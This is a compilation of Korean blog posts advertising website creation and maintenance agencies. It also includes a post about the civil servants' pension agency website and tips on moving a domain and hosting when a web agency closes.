장신로 139 케이티온 청주지사충청북도 청주시 상당구 사직대로 371케이티온 천안지사충청남도 천안시 서북구 부성8길 38 계룡타워 503-2호케이티온원주지사강원도 원주시 현충로58번길 29-1  ​ ​​안녕하세요.블로그나 인스타, 혹은 페이스북 등 사업체를 홍보하는 다양한 방법이 있지만,  무엇보다도가장 전문적으로 소개할 수 있는 채널은 바로 홈페이지입니다. ​​​종류를 불문하고다양한 사업체에서 홈페이지를 구축하는 이유는 사업의 규모와 상관 없이 본사의 색깔을 소비자에게 분명히 전달하고 소통하면서궁극적으로는 효과적인 마케팅을 하고자 함입니다. ​​​ ​​​​그렇기 때문에 단순히홈페이지를 구축하는 것으로, 디자인만 한 번 바꿔주는 것으로 그것이 매출향상으로 이어진다는 보장도 없습니다.​​​하지만 마케팅 솔루션까지 갖추고전문적인 홈페이지 관리를 저렴한 가격에 해주는 업체가 있다면 꼭 해 볼만 하죠!​​​​​ ​​​​​업체를 찾아보면 경험이 그리 많지 않거나, 전문 웹디자이너들이아니거나, 비용이 너무 비싸거나.. 등등​​​딱 적당한 업체를 찾는 것이 정말 쉽지가 않아요. ​​​​그렇지만 잘 찾아보면 업계에서도오래되고 경험이 많아 잔뼈가 굵고 일을 제대로 하는 곳이 있더라구요.  ​​​​​ ​​​​​웬만한 기술력으로는 업계에서 장기간 버티기 힘든 업종이 바로 홈페이지 제작,리뉴얼 및 홈페이지관리 즉, 유지보수인데요. ​​바른웹은 10년 넘도록 만 여개가 훨씬 넘는 홈페이지를 제작 및 관리해 온 회사예요.​​​​​​ ​​​​​​그렇기에 긴 기간동안 자체적으로 개발해 온 다양한 형태의 프로그램이 이미 탄탄히 구축되어 있어 PC, 모바일, 반응형 홈페이지를 모두 무료로 제작할 수 있으며, 전 과정이 전문 웹디자이너들에 의해서 진행되요. ​​​사이즈 제작은 템플릿 형태 뿐 아니라 PC, 모바일 각 32페이지, 반응형 8페이지로 제작되구요. ​​​의뢰인이 원하는 도메인 주소를직접 선택하고 결정하는 것은 물론, 백업 서비스 2회, 바이러스, 디도스 차단 등을 위한 강력한 방화벽 세팅까지 모두 무료로 지원됩니다. ​​​​​​ ​​​​​​홈페이지 구축이나 리뉴얼 시에는 웹 디자이너와 의뢰인이 홈페이지 오픈 직전까지 긴밀하게 의견을 조율하면서 카테고리, 기능, 디자인 등의 방향을 함께 결정하게 되는데요. ​​의뢰인의 임의 수정까지도 끝까지 반영해주는 업체이기 때문에 정말 차원이 다른 만족감을 주는 것 같아요. ​​홈페이지 소유권은 곧바로 양도되어 독립형 홈페이지를 소유할 수 있게 되며, 국내 대표 포털사이트에도 무료로 등록됩니다. ​​​​​ ​ ​​​​​​이후 유지, 보수 등의 관리는 5년 간 계약을 통해 월 단 3만원의 비용으로 믿고 맡기면 되는 구조. ​​사업체 유지를 단기간 할 것이 목적이 아니라면, 당연히 사업 내내 지속적으로 유지, 보수 등의 관리가 이루어져야 하는데요. ​​​​​ ​ ​​​​​바른웹은 간편한 관리자 모드를 구축하여 수정이나 변경을 관리자가 손쉽게 작업할 수 있도록 하여 시간을 훨씬 절감할 수 있고, 홈페이지 관리는 본사 전문 디자이너들이 꼼꼼하게 관리합니다. ​​사용자 만족도가 높은 바른웹. 퀄리티가 남다르게 높은 작업물을 저렴하고 합리적인 비용으로 이용할 수 있는 업체예요. ​​​마케팅 솔루션까지 신경 쓴제작, 리뉴얼, 관리. 아래 링크 통해 알아보고 포트폴리오도 받아보세요 ​​​​​홈페이지 관리 및 리뉴얼 / 구축 바른웹 공무원연금관리공단 홈페이지 살펴보기  안녕하세요 잇님들~갑자기 날씨가 급 쌀쌀해졌습니다.마음을 가다듬고 오늘 포스팅 시작하겠습니다바로 온르은 공무원분들이 필수로 확인해야할 곳인공무원연금관리공단 홈페이지를 알아볼까 하는데요​어떠한 정보들을 볼 수 있을까요?아무래도 연금에 관해서 관심이 많으실듯 합니다​공무원 연금제도는 일단 공무원 및 유족을 위한 종합사회보장제도입니다대중소 일반 기업들과 달리 공무원의 경우 퇴직이나 사망등과 같은공부로 부상, 질병, 장애에 대하여 급여를 실시하여공무원 및 유족의 생활안정 및 복리향상에 기여를 목적을 두고 잇는데요!나랏일 하는데 그정도 보상을 해주어야하죠!   공무원연금관리공단 홈페이지를 통하서 바로 확인이 가능합니다일단 공무원 연금에 대해서 궁금하신 분들은 자주 들어가보실텐데요아무래도 가장 많이 찾아보는게 바로 자주 찾는 질문일 겁니다   이 질문란에서는 연금, 재해, 융자, 복지사업, 교육 등과 같으 내용에 대해서 여러 질문들을 볼 수가 있고조회수가 많은 순으로 사람들이 어떠한 것을가장 많이 질문하는지 파악할 수 있습니다~   그 다음 서식란에서는 각종 서식도 받아볼 수 있습니다공무원들의 경우에는 서류나 내역서관련 작성을 많이 하게되는데요주로 공식적인 문서문서와 같은 서식을 많이 모아둔 곳이기도 합니다다양한 확인서들에 대해서 확인해보실 수 있습니다~   그다음으로 연금자료일을 가보게 되면 연금통계에 관해서많은 자료들이 나와잇습니다또한 매해별로 연금통계가 어떻게 되는지 증감에 대해서알아볼 수 있는 통계조사자료들이 있습니다   그리고 연금사업이 무엇인지에 대해서 알아볼 수 있습니다연금관리공간에 대해서 잘 모르시는 분들은이곳에 대해서 한번쯤 읽어보시는 것이 좋을듯합니다아무래도 연금사업이 도대체 무엇이고 어떻게지급이 되는지에 대해서 잘 알아둘 필요가 잇씁니다뉴스같은데 보면 연금에 대해서 여러 가지 이슈들이 있고이를 이해할려면 기본적인 지식은 가지고 있어야겠죠?   마지막으로 공지사항을 통해서 공무원들에게 필요한다양한 소식들을 확인할 수 있습니다공무원 연금관리공단 홈페이지 공시하앙을 통해서여러 이벤트가 공고 및 공지에 대해서 확인이 가능하고기타 궁금한 점에대해서는 공무원연금관리공단 홈페이지에직접 방문을 해보시면 될 것 같네요! ​      지금 기업, 제품, 서비스를 알리기 위한 ​홈페이지 제작을 다 마치셨나요?​​​​​​​ 홈페이지 제작도 다 마쳤으니 이제 다 끝난 듯 느껴지지만 절대 그렇지 않습니다. ​​​​​​​이제 관리라는 큰 산이 남아 있습니다. ​​​​​​​홈페이지를 만든 대표님, 또는 관리를 해야 하는 담당자들은 어떻게 해야 회사의 사이트를 잘 관리할 수 있을까 늘 고민하게 됩니다. ​​​​​​​이런 고민은 회사의 매출과도 이어지기에 빠질 수 없는 부분입니다. ​​​​​​​이때, 디자인, 레이아웃을 포함해 기능적으로 잘 관리되고 있는 홈페이지인지는 우리가 소비자 입장에서 잘 알게됩니다.​​​​​​​a라는 브랜드를 알아보기 위해 홈페이지에 들어갔지만,메뉴도 제대로 없고 오류만 뜬다면 당연히 소비자는 그 사이트를 나오게 됩니다. ​​​​​​​이렇게 홈페이지를 이탈하는 경우가 반복된다면 결국 충성스러운 구매 고객을 놓칠 수 있습니다. ​​​​​​​브랜딩을 위해 늘 신경 써야 하는 홈페이지 관리, 그저 만들어 놓는다고 전부는 아니기에 지금부터 알려드리는 홈페이지의 기능을 관리하고 유지하는 방법, 잘 기억해주시길 바랍니다.       ​​ ​         사이트 관리, 꼭 필요해? ​​​​​​정말 기본적인 질문입니다. 하지만 '홈페이지를 관리해야 한다'​는 이 기본적인 원리를 이해해야만 사이트를 관리하기 위해 시간과 비용을 투자할 수 있습니다. ​​​​​​​하나의 사이트를 만들었다면 관리를 위해 필요한 것들이 있습니다. ​​​​​​​도메인, 호스팅, 이어 정기적인 업데이트와 소스, 오류 관리도 해야 합니다. ​​​​​​​잘 관리된 홈페이지는 다양한 역할을 합니다. 불필요한 부분 같아도 홈페이지는 소비자에게 우리 브랜드를 각인시키고 구매로 이어지게 만듭니다. ​​​​​​​소비자에게 인식되는 우리의 첫인상​이라고 할 수 있습니다. ​​​​​​​소비자가 이용하기에 편리하고 늘 관리된다는 인상을 주는 게 장기적인 마케팅 측면에서도 중요합니다.      ​​​​​​​ ​  ​​  초보자가 알아야 하는 홈페이지 관리​​​​​​사이트 관리를 위해서는 기본적으로 꼭 관리해야 하는 것들이 있습니다.  ​​​​​​① 기술 유지 : ​홈페이지의 기능과 관련된 것을 말합니다. 복잡한 기능을 가진 것도 있는 만큼 이는 홈페이지를 만들어준 곳에 의뢰를 하는 것이 좋습니다. ​​​​​​​② 서버 유지 : 접속자가 많을 때에도 안정적으로 홈페이지에 연결될 수 있도록 하는 것입니다.  ​​​​​​③ 디자인 관리 : 홈페이지에 들어갔을 때 보이는 이미지, 레이아웃 등을 보기 편한 방법으로 관리해주는 것을 말합니다. 이벤트 시 팝업을 추가한다면 이것도 때에 따라 보수를 해줘야 합니다. ​​​​​​​위의 내용들은 가장 필수적으로 하나의 홈페이지가 운영되기 위해 갖춰야 할 부분들입니다. ​​​​​​​만약 위와 같은 부분들을 관리할 만한 인력이 없다면 홈페이지 제작을 의뢰했던 곳 또는 전문 관리업체에게 맡기는 것이 가장 좋습니다.       ​​    사이트 관리, 마케팅과 연결하기 ​​​​​ 두 회사의 홈페이지가 있습니다. ​​​​​​​A업체의 홈페이지는 단순히 정보만이 나열되어 있습니다. B업체의 홈페이지에는 정보와 동시에 실제 고객들이 참여할 수 있는 이벤트나 시각적인 요소들을 다양하게 배치했습니다. ​​​​​​​Q. 그렇다면 소비자는 어떤 홈페이지에 더 매력을 느끼게 될까요? ​​​​​​​​​​​​​​A. 바로 B업체의 홈페이지입니다. 방문한 고객들을 위해직접 참여할 수 있는 이벤트를 많이 늘렸고 동시에 다양한 이미지나 정보를 시각화하여 간결하게 정보 전달을 했기 때문입니다. ​​​​​​​지금의 홈페이지가 매출까지 이어지기를 원한다면 그만큼 홈페이지를 이용할 줄도 알아야 합니다. ​​​​​​​이를 실현시키기 위해,홈페이지에 팝업 이벤트 창을 만들어서 더 많은 사람을 참여하도록 하거나, 한눈에 들어오는 이미지를 통해제품 및 기업을 각인시킬 수 있어야 합니다.  ​​​​​​소비자들은 그저 만들어진 사이트보다는 내가 참여하고, 원하는 정보를 한눈에 확인할 수 있는 홈페이지에 더 크게 반응하기 때문입니다.  ​​​​​​​​​​ ​​​​​​​ 제작부터 관리까지 한 번에 하는 방법은? ​​​​​​요즘은 홈페이지를 만들 때,전문가에게 의뢰하는 것이 대세입니다. ​​​​​​​전문가가 만든 홈페이지가 기능적인 면이나 디자인적인 면에서도 더 뛰어나기 때문입니다. ​​​​​​​관리도 마찬가지입니다. ​​​​​​​유지나 기술, 디자인적인 면까지 직접 하기엔 한계가 있기에 홈페이지 관리는 전문가들에게 의뢰하는 것이 가장 효율적입니다. ​​​​​​​특히 제작부터 관리까지 한 번에 해주는 곳에 의뢰를 한다면 대표님의 부담은 훨씬 줄어듭니다.  ​​​​​​다만, 제작 관리를 하는 업체의 실력은 반드시 확인해야 하는 부분입니다.  ​​​​​​ ① 기존 사이트 제작 포트폴리오 확인하기 ② 사이트 제작 전 기획 유무 ③ 제작 후 관리 시 SEO 점검 및 마케팅 다각화 ④ 홈페이지의 기능, 기술, 보안 유지 ​​​​​​​​위와 같은 내용은 컨택 시 꼭 안내를 받아야만 제작 관리에 있어서 돈 낭비를 하지 않습니다. ​​​​​​​사이트 관리의 전문가들을 만난다면 홈페이지에 대한 걱정은 덜고 회사의 업무에만 집중할 수 있다는 장점이 있습니다. ​​​​​​​브랜드라이터의 고객들은,자신의 비즈니스에만 집중할 수 있습니다. ​​​​​​​홈페이지 제작부터 관리까지 각 분야의 전문가들이 투입되어 일을 진행하기 때문입니다. ​​​​​​​전문가의 시선에서 기업 홈페이지의 문제점을 진단하고 분석-> 기획-> 제작-> 관리의 과정을 담당합니다. ​​​​​​​홈페이지를 만드는 것부터 관리까지가 고민이라면 전문가들의 도움을 받아 보시길 바랍니다. ​​​​​​​연매출 50억의 어학원, 전문 홈트레이닝 업체, 클래식 에이전시의 성공을 도운 베테랑들이 함께하겠습니다.  ​​​​​​​브랜드라이터문의 010-2033-8151 홈페이지 배너 실제 홍보 매출과 연결 시키는 방법클릭 한 번으로 소비자들을 끌어 모으는 것 하면 무엇이 떠오르시나요? 아마 주저 없이 배너를 이야기하는 ...blog.naver.com ​​​​​​​​​​​​ ​안녕하세요!홈페이지제작 전문 에이전시핏소프트입니다.  홈페이지는 처음 어떻게 만드는지도 중요하지만 그 이후에어떻게 관리되는지도 매우 중요하다는 사실, 모두 아실 것입니다.지속적인 유지보수는 빠르게 변화하는 트렌드 속에서우리 회사의 홈페이지를 경쟁력 있게 만들어주고 이는 곧고객이 사이트를 이용하는 편리성과도 연결돼 기업 이미지와매출에 영향을 주기 때문에 중요합니다.​ 홈페이지관리,핏소프트에서는 간편합니다!핏소프트는 고객이 편리하게 홈페이지를 관리할 수있도록 유지보수 시스템을 제공합니다.그럼 어떻게 유지보수를 신청하면 되는지 안내 드리겠습니다!​ ​①유지보수 신청  ②승인 확인(알림톡)  ③관리자 접속(회원가입 후 로그인 진행)​ ④유지보수 요청​신청할 수 있는 유지보수 서비스는 개발, 디자인,페이지, 부가서비스, 정액제, 기타 서비스로 나뉘고각 유지보수 분야에 따른 세부 항목을 선택한 뒤에전달 사항을 함께 적어주시면 됩니다.​​정액제 상품은 일반형, 실속형, 패키지형으로 나뉘는데쇼핑몰 리뉴얼 및 신규 제작한 고객만 구매 가능합니다.정액제는 최소 3달 단위로 구매할 수 있고 모든 서비스는6달 진행 시에 10% 할인, 1년 진행 시에 20% 할인됩니다.​단, 콘텐츠의 양이나 난이도가 높은 경우에는 협의 후에건수 계산에 변동이 생길 수 있으니 이 점도 참고해주세요!​ ​유지보수와 관련된 자세한 사항은 핏소프트 홈페이지또는 직접 문의를 통해 확인하실 수 있습니다.​☎ 문의 전화 ☎02) 6959 - 8362​ ​ 홈페이지 만들기 알아보고 계세요?제작비용이 정말 천차만별이지요.​점점 오프라인 쇼핑보다 온라인 쇼핑이늘어가고 있습니다.​게시판이나 고객센터 문의도상담센터 보다는 홈페이지를 통해하는 사람들이 늘고 있죠.​대한민국 남녀노소내손안에 스마트폰 시대이다 보니어쩔 수가 없습니다.​더구나 요즘 언택트 시대라 불리는시대가 되다보니,그런 성향이 더욱 강해지고 있습니다.​ ​​기업에서는, 회사에서는, 쇼핑몰에서는그만큼 홈페이지 만들기에더 신경을 쓸 수 밖에 없습니다.​웹사이트는 우리 회사의얼굴이고, 매장이고, 상담센터이고,홍보실이니까 말입니다.​​ ​​한때 개인 홈페이지 만드는 것이유행이었습니다.요즘이야 SNS가 워낙 잘 발달되어 있어서그런 것들을 활용하지만,​인터넷 초창기 시절만 해도전산 전공 (요즘은 컴퓨터 공학과죠)을 한 사람들을 중심으로개인 웹페이지를 만드는 것이 유행이었습니다.​하지만 하나같이 단순하고 촌스러웠죠.​옛날이라서가 아닙니다.​개인의  홈페이지 만들기 수준에는한계가 있을 수 밖에 없으니까요.​ ​​홈페이지 만들기는 홈페이지 제작 전문가에게 의뢰 하는 것이당연한데요,​문제는 실력과 비용입니다.​실력과 비용이 꼭 비례하는 것이 아니다보니가급적 적은 비용으로가급적 좋은 품질의홈페이지 만들기가 우리의 목표죠.​​ ​​회사나 가정에서 정수기 쓰시나요?​사서 쓰시는 분도 계시고,렌탈해서 쓰시는 분도 계시죠.​렌탈해서 쓰시는 분들은 왜 사지 않고렌탈을 선택하셨나요?​아마도, 처음에 목돈이 들어가지 않는 것과정기적으로 관리를 해 주는 것과매달 렌탈비는 큰 부담이 안된다는 것이공통적인 이유겠지요?​​ ​​홈페이지도 이런 시스템으로 운영이 가능합니다.​홈페이지 제작은 비용을 받지 않고,관리에 대해서만 비용을 받는 홈페이지 제작업체를 소개해 드려요.​​ ​"홈페이지 제작을 정말비용을 내지 않고 할 수 있나요?"​▶네!​​"품질이 별로이지는 않을까요?"​▶아니요. 절대요. 포트폴리오를 확인해 보세요.​​"신생업체 아니에요?" ▶아니요. 설립한지 7년이 넘어가는회사입니다.​​"홈페이지가 임대형 아닌가요?임대형도 있다던데..."▶아닙니다. 고객 소유형 입니다.​​ ​무엇을 걱정하시는 것인지 잘 압니다.하지만 정상적이고, 심미적으로도기능적으로도 훌륭한 홈페이지를 전문가들이 제작해 드립니다.​ 정리해 드립니다!​​​제작비용은 없고,월 관리비용이 있습니다.월3만원 입니다.​​​ ​이외에도,모바일용 홈페이지 제작도메인 등록2차백업방화벽 세팅​등의 부가적인 작업도 같이 해드립니다.​​ ​​ ​​ ​​ ​ ​ 안녕하세요 비전테크입니다!사업을 진행하시는 분들의 가장 큰 고민은 홈페이지 관리 라고 많이 듣는데요. 특히나 온라인에서 물건이 많이 유통되고 있는 요즘에는 특히나 더 중요한 거 같습니다. 가게를 가더라도 가기 전에 온라인상에 후기가 어떤지 디자인이 어떤지 온라인을 통해 보고 가는데요. 그래서 홈페이지 유무와 관리 여부, SNS 채널 관리까지 온라인상에서도 신경 써야 할 점이 많습니다.이미 많은 사업자분들께서는 홈페이지 제작 이후에 유지관리를 위해서도 투자를 하고 계신데요. 홈페이지 제작도 중요하지만 그만큼 중요한 게 유지 보수입니다!그렇다면 유지 보수는 왜 중요할까요?​수시로 디자인, 텍스트 업데이트 가능 가게도 매일 청소하고 정리 정돈이 필요한 것처럼 홈페이지도 마찬가지입니다. 몇 년 동안 그대로 두는 경우에는 소비자가 홈페이지를 들어갔을 때 단번에 관리되고 있는 않는 곳이라는 것을 알게 되는데요. 일단 공지사항 일자 등으로 파악도 가능하지만 디자인과 아우트라인부터가 노후된 이미지를 주게 됩니다. 그래서 홈페이지 유지 보수가 중요합니다! 유지 보수를 계속 주게 되면, 기존의 디자인 아우트라인은 둔 상태에서 사진, 색상, 일부 페이지 수정 등 노후된 페이지를 바로바로 관리해 줄 수 있습니다. 그렇게 되면 소비자로 하여금 관리되고 있는 곳이라는 인식을 주면서 더욱 신뢰감 있는 이미지를 만들어 주게 되죠!​현명한 소비를 위해 업체 선정부터 홈페이지 제작을 하는 데에도 비용이 들지만 유지관리하는 데에도 비용이 듭니다. 또는 제작은 무료이지만 유지관리를 위한 비용을 요구하기도 하죠. 유지관리는 매달 또는 매년 고정 비용으로 나가는 비용이기 때문에 지출을 줄여주는 게 좋은데요.  그렇다고 무조건 저렴하다고 좋은 건 아닙니다. 해당 업체에서는 경력 있는 전문가가 진행해 주는지, 디자인 관리는 잘하는 곳인지 등등 관리 조건도 꼭 확인해봐야 하죠!​ 비전테크에서는 경력자분들이 관리해드리고 있습니다. 수시로 홈페이지를 체크해서 오류사항이 없는지 확인하고, 배너 제작, 레이아웃 변경 등 필요한 관리 사항을 업체 관리자와 밀착해서 관리해 드리고 있는데요. 이 외에도 검색 명화 브랜드 키워드, 태그 등이 잘 노출되고 있는지, 페이지별 랜딩 속도와 디자인은 업데이트되고 있는지 등등 홈페이지 전문가가 아니면 관리하기 힘든 부분까지 다 관리해드리고 있습니다.  더 궁금한 사항이 있다면 간편 카카오톡 상담도 가능합니다!비전테크 카카오톡 채널 : http://pf.kakao.com/_twHJK​ 이뿐만 아니라 합리적인 가격에 홈페이지 유지관리를 제공해드리고 있습니다! 저희 비전테크에서는 홈페이지 제작부터 유지관리, 그리고 SNS 홍보까지 모든 홈페이지 관리 플로우가 마련되어 있습니다. 그래서 이미 많은 기업에서는 유지관리부터 업체 홍보까지 진행하는 경우도 많습니다~ 한 곳에서 진행을 하기 때문에 더 합리적인 비용에 이용이 가능하고 원활한 커뮤니케이션이 가능합니다. 또한 업체에서 온라인상에 홍보하고자 하는 진행 방향을 이미 알고 있기 때문에 유지관리부터 홍보까지 더욱 원활한 진행이 가능하죠! ​비전테크에서 디자인에서 홍보까지 비전테크에서는 다른 업체에서 제작한 홈페이지도 유지 보수가 가능합니다. 사전에 기존의 홈페이지에서 아쉬운 디자인, 콘셉트 부분에서 수정하고자 하는 방향에 대해 자세한 상담을 진행하고 이후에 유지 관리 솔루션을 제시해드립니다. 또 앞에서 말한 것처럼 디자인 제작뿐만 아니라 SNS 홍보까지 진행이 가능한데요. 업체를 홍보해야 많은 분들이 홈페이지를 방문하게 되겠죠! 블로그, 페이스북, 인스타그램 등 다양한 SNS 채널이 있는 만큼 업체의 특성 또는 원하는 방향에 맞추어서 채널을 개설하고 홍보 진행을 해드립니다. 상위 노출 방법, 플로우 증가 방법 등 이미 노하우를 가지고 있는 분들이 진행해 드리기 때문에 단시간에 큰 효과를 볼 수 있죠! ​비전테크에서 어떤 작업이 가능한지 자세히 알고 싶다면 홈페이지를 방문해 주세요! 비전테크System Integration e-Biz Consulting IT Outsourcing System Integration 기업, 영업, 유통 관리부터 학교, 동아리, 밴드 소모임까지 다양한 환경에 맞춘 제작 및 관리 솔루션을 제시합니다. ▶ 기업, 유통, 영업 활동 관리 솔루션 ▶ 학교 동아리, 밴드 등 커뮤니티 관리 솔루션 ▶ 기업, 종교시설 홈페이지 관리 솔루션 ▶ 동영상 제작 및 관리 솔루션 System Integration ICT Service Provider 시스템 통합 구축 서비스, IT 아웃소싱 서비스, SW 테스팅...vision-tech.co.kr   ​ 홈페이지 제작 관리업체가 폐업한다고 알려왔다면 홈페이지 서버 및 도메인 이전을 신속하게 준비하셔야 합니다. 만약 흐지부지하다 서버사용기간이 종료가 된다면 홈페이지와 관련 된 모든 파일들이 사라질 수 있으며최악의 경우에는 비싼 비용을 들여서 새로 제작해야하는 불상사를 맞이할 수 있습니다.  따라서 미리 대비하시고, 이레 따른 신속한 대처가 필요할 것 입니다.​그럼 아래 두가지 경우로 나눠서 폐업시 대처 방법을 알려드리겠습니다.  첫번째, 새로운 관리업체와 계약할 경우 ​이때는 기존 관리업체를 통해 아래 세가지 사항들을 받아두셔야 합니다.​1. 도메인 업체 정보 - 업체 홈페이지 주소- 로그인 아이디, 비밀번호​2. 호스팅(서버) 업체 정보 - 업체 홈페이지 주소- 로그인 아이디, 비밀번호​3. FTP 접속 정보​위 세가지 항목을 그대로 복사하셔서 기존업체에게 요청한 후 이 정보를 받아서 새로운 업체에게 넘겨주시면, 홈페이지 및 도메인 이전이 진행 될 수 있습니다.  두번째, 저렴한 홈페이지 유지를 위해 자체적으로 운영할 경우 ​만약 회사내부에 홈페이지를 관리할 수 있는 직원이 있다면, 홈페이지유지시 발생하는 많은 비용을 절감하실 수 있습니다.(하지만 자체적으로 운영하기 위해 비싼 새 직원을 고용하는 선택은 하지 마시길 바랍니다 ^^;)​1. 도메인 이관 신청​도메인 소유자가 본인으로 되어 있다면 이관할 필요는 없습니다.하지만 만약 관리업체 명의로 되어 있다면, 반드시 이관 신청을 해야 합니다.​홈페이지를 운영하면서 도메인 소유자의 필요성을 느끼지 못하기 때문에 이는 간과하고 그냥 넘어가는 경우도 있는데요만약 웹메일 및 그룹웨어와 같은 도메인정보 변경이 필요한 작업이 필요할시에 이를 진행하지 못할 수도 있으므로 반드시 꼭 이관신청을 해주셔야 할 것입니다.​이관 신청은 현 도메인업체측 고객센터로 연락하시어 상담원의 요청에 따라 진행하시면 됩니다.​​2. 호스팅(서버) 이전​호스팅 이전은 아래 포스팅에 자세히 설명해 두었습니다.참고하시기 바랍니다.​https://kty4523.blog.me/221069228239 홈페이지 호스팅(서버) 이전하는 방법여러가지 이유로 홈페이지를 새 보금자리로 이전해야 할경우가 있습니다.이때 어떤 절차로 이전이 이루어지...kty4523.blog.me  끝으로 홈페이지 제작 관리업체에서 아무 통보없이 부도가 나는 경우도 있습니다.이때는 업체와 연락이 되지 않아 서버, 도메인 정보를 받아 올수가 없게 되며사실상 홈페이지 이전 및 복구는 불가능하게 됩니다.​따라서 홈페이지 제작 관리업체의 존속여부를 떠나서 ​1. 도메인 업체 정보 - 업체 홈페이지 주소- 로그인 아이디, 비밀번호​2. 홈페이지 백업 파일- 데이터 백업- DB백업 ​위 두가지는 꼭 보관해두시기 바랍니다.  홈페이지 이전 상담 문의02-2297-6082 ​​코로나19가 일상이 되면서 필요한 물건과 서비스를 온라인으로 구매하는 사람들이 점점 더 많아지고 있습니다. 온라인 쇼핑으로의 전환은 가속화되고 있죠. 그래서 많은 기업과 브랜드에서는 인스타그램, 블로그, 페이스북, 유튜브 등 다양한 소셜미디어를 운영하며, 고객들과 소통하고 있습니다. ​전 세계 소셜미디어 이용자 수가 전년 대비 약 13.2% 증가했다고 합니다. 앞으로도 마케팅에서 소셜미디어의 비중은 계속 커질 것이 분명합니다. 그래서 소셜미디어 운영은 이제 브랜드의 상품 및 서비스 홍보에 필수가 되었습니다.​각 미디어의 특성에 맞게 지속해서 내 브랜드를 포스팅한다면, 각 미디어에서 내 브랜드의 채널 및 페이지를 팔로우하는 사람들이 자연스럽게 관심을 두고 모이게 됩니다. ​이때 모인 팔로워들의 마지막 종착지를 어디로 이끌어야 하는지가 중요한데, 바로 브랜드 홈페이지라 할 수 있습니다. 홈페이지는 기업이 인터넷을 통해 전 세계인과 만날 수 있는 만남의 장입니다. 상품의 온라인 쇼룸도 되며, 가상세계에 설치한 또 하나의 공간이기도 합니다. ​​ 스타트업 홈페이지를 시작할 때 갖춰야 할 필수 요소​언택트 시대인 요즘, 집에서 인터넷 서핑을 하면서 보내는 시간은 늘어났습니다. 그래서 스타트업 홈페이지를 시작한다면, 홈페이지는 무엇보다도 중요한 브랜드의 첫인상입니다. ​스타트업 홈페이지가 갖춰야 할 필수 요소는 다음과 같습니다.​1. 웹사이트 도메인은 외우기 쉬운 것으로 해야 한다.2. 비즈니스를 대표하는 고유한 로고를 상단에 위치시켜야 한다.3. 장소 등의 비즈니스와 관련된 필수 정보들을 자세하게 넣어야 한다.4. 고객들에게 신뢰를 줄 수 있는 고객 리뷰나 추천 영상을 삽입해야 한다.5. 관심 주제를 찾아볼 수 있는 검색창 기능을 넣어야 한다.​즉, 새로 시작하는 스타트업을 위해 홈페이지를 구축하고자 한다면 고객들을 만족하게 할 수 있는 요소에 대해 알아두어야 합니다.​​​ 스타트업 홈페이지 성공하기 위해서는?​스타트업 홈페이지를 할 때 목표해야 하는 것은 브랜딩입니다.​브랜드는 제품이나 서비스를 마케팅하는 데 있어 중요하기 때문입니다. 강력하면서도 한결같은 브랜드를 만들면 사이트 방문자 수와 고객의 충성도를 높일 수 있습니다.소규모로 시작해서 홈페이지 관리 능력을 키우고 싶다면, 소셜미디어 마케팅에 집중해야 합니다. 그렇기 위해서는 검색엔진최적화(SEO)를 배우는 것으로 시작할 수 있습니다.​SEO는 자신의 웹사이트를 구글이나 네이버와 같은 검색엔진의 검색결과 상단에 드러낼 수 있도록 최적화하는 방법입니다. 비용을 들이지 않고 기존에 가지고 있는 콘텐츠만을 활용해 지속해서 노출할 수 있다는 장점이 있습니다.​요즘은 신뢰할 수 있는 콘텐츠를 찾으려는 고객을 사로잡는 데 어려움이 있습니다.​검색결과 페이지에서 과장, 허위 광고에 넘어가지 않으려는 고객들은 광고를 클릭하기보다는 시간을 들여서라도 정확한 정보를 볼 수 있는 콘텐츠를 찾습니다. 이런 고객에게 적극적으로 어필하려면 SEO 작업으로 콘텐츠 노출 순위를 높여주는 작업이 중요합니다.​​ 새로 리뉴얼한 홈페이지,어떤 식으로 마케팅해야 할까?보통 홈페이지 리뉴얼 기획할 때 고객들의 행동 패턴에 따르는 경우가 많습니다. 하지만 그렇지 않은 예도 있습니다. 관리자, 운영자의 관점에서 사용할 때 불편함이 따르다 보니 이를 해소하고자 리뉴얼 하는 예도 있습니다. ​홈페이지, 쇼핑몰 활용의 절대 이용자는 ‘고객’입니다. ​새로 디자인을 개편하고 UI 환경을 트렌드에 맞게 바꾸더라도 우리 서비스, 제품에 맞춰 고객이 필요로 하는 구성에 대한 교정과 개선이 필요합니다. 홈페이지를 개편시키고자 마음을 먹고 난 후 어떤 기획 방향을 가지고 새로 제작할지 정해 두더라도 홈페이지를 개편시키는 동안 계속해서 세부적인 사항이 변할 수 있습니다. ​처음 기획 의도와 다른 홈페이지를 마주하게 되는 일도 있습니다. 그래서 리뉴얼 후 마케팅을 새로 구축하고자 한다면 홈페이지에 대한 세부적인 개선이 필요할 수 있습니다.​ ​마케팅을 새로 시작하거나, 다시 재편성하는 데 필요한 준비 기간에는 마케팅분석 도구를 활용하기 위한 셋업 기간이 필요합니다. 이 기간에 활동해야 할 항목들을 정리하고 홈페이지에 적용하는 시기를 거쳐 검색엔진, 소셜미디어 등을 기간별로 정리해야 합니다.​홈페이지를 관리하기 위해서는 많은 것들이 필요로 합니다. ​주기적으로 소셜미디어 마케팅 활동해야 하며, 광고 채널을 생각해야 합니다. 최신의 디지털 트렌드에 관심을 둬야 하며, 지속해서 사이트의 보안 기능을 업데이트하는 것에도 신경을 써야 합니다. 그래서 자신만의 노하우나 풍부한 경험과 노하우를 갖춘 광고에이전시를 찾는 것이 중요합니다. ​ ​광고에이전시 나비랑에서는 데이터 분석을 통한 차별화된 전략을 수립하고 있습니다. ​브랜드의 영향력 확대를 위한 브랜드 디자인 솔루션을 제안하는 등의 디지털 캠페인을 운영하며 도움을 드리고 있습니다. 콘텐츠는 기계처럼 찍어낼 수 있는 것이 아닙니다. 나비랑에서는 다양한 레퍼런스를 제안할 수 있도록 적합한 콘텐츠에 관한 연구를 지속하고 있습니다. ​그리고 브랜드와 고객들을 연결하는 콘텐츠를 기획 및 제작하고, 이 콘텐츠를 매개로 여러 마케팅 활동을 하고 있습니다. 홈페이지관리를 성공적으로 운영하고 싶다면 나비랑에서 도움받아보시길 바랍니다. ​​ ​​​​​​​​​​​​ ​​​​​​​#홈페이지관리 #홈페이지제작 #스타트업마케팅 #기업마케팅 #나비랑마케팅 웹브라우저는 인터넷사용자들이 실행했을 때 먼저 보이는 시작페이지가 존재합니다. 대부분 평소 자주 이용하는 웹페이지로 설정하는데요. 특히 네이버, 구글 등 메일을 확인할수 있고 원하는 정보를 바로 찾을 수 있는 검색창 사이트를 주로 많이 설정하는 경우가 많습니다.​인터넷의 시작페이지로 설정하면 해당사이트이용이 바로 가능하기 때문에 편리하고 시간을 절약할 수 있는 